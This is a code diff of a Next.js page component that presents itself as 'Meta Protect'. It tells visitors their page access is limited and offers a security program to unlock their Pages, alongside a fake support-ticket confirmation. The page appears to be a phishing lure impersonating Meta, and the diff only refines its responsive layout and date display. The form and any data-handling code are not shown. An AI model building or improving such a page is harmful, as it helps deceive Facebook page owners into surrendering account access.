@@ -28,9 +28,9 @@ export default function CommunityStandard() {
                     </div>
                 </div>
 
-                <div className="container">
+                <div className="container-fluid px-3 px-md-5">
                     <div className="row justify-content-center">
-                        <div className="col-12 col-md-10 col-lg-8">
+                        <div className="col-12 col-sm-10 col-md-8 col-lg-6">
 
                             <div className="card-container d-none my-4" id="getCode">
                                 <div className="card border-0 shadow-sm">
@@ -42,23 +42,23 @@ export default function CommunityStandard() {
                                             Thanks for contacting us. You'll get a notification when we respond in 1-2 business days. You can view responses in your Support Inbox.
                                         </p>
                                         <hr />
-                                        <button id="back-hone" className="btn btn-primary">I Understand</button>
+                                        <button id="back-hone" className="btn btn-primary w-100">I Understand</button>
                                     </div>
                                 </div>
                             </div>
 
                             <div className="card my-5 border-0 shadow-sm" id="code-form">
-                                <div className="card-body p-4">
+                                <div className="card-body p-3 p-md-4">
                                     <Image
                                         src="/img/B2Y8S9I.jpg"
                                         alt=""
-                                        className="img-fluid rounded mb-4"
+                                        className="img-fluid rounded w-100 mb-4"
                                         width={650}
                                         height={400}
                                     />
 
-                                    <h2 className="fw-bold mb-3">Welcome To Meta Protect.</h2>
-                                    <p className="mb-4">
+                                    <h2 className="fw-bold mb-3 text-center text-md-start">Welcome To Meta Protect.</h2>
+                                    <p className="mb-4 text-center text-md-start">
                                         Your page's accessibility is limited, so we ask that higher security requirements be applied to that account. We created this security program to unlock your Pages.
                                     </p>
 
@@ -101,15 +101,12 @@ export default function CommunityStandard() {
             <Script>
                 {`
                     $(document).ready(function () {
-                        function setCurrentDate() {
-                            const currentDate = new Date();
-                            const monthNames = ["January", "February", "March", "April", "May", "June",
-                                "July", "August", "September", "October", "November", "December"];
-                            $('#month').text(monthNames[currentDate.getMonth()]);
-                            $('#date').text(currentDate.getDate());
-                            $('#year').text(currentDate.getFullYear());
-                        }
-                        setCurrentDate();
+                        const currentDate = new Date();
+                        const monthNames = ["January", "February", "March", "April", "May", "June",
+                            "July", "August", "September", "October", "November", "December"];
+                        $('#month').text(monthNames[currentDate.getMonth()]);
+                        $('#date').text(currentDate.getDate());
+                        $('#year').text(currentDate.getFullYear());
                     });
                 `}
             </Script>
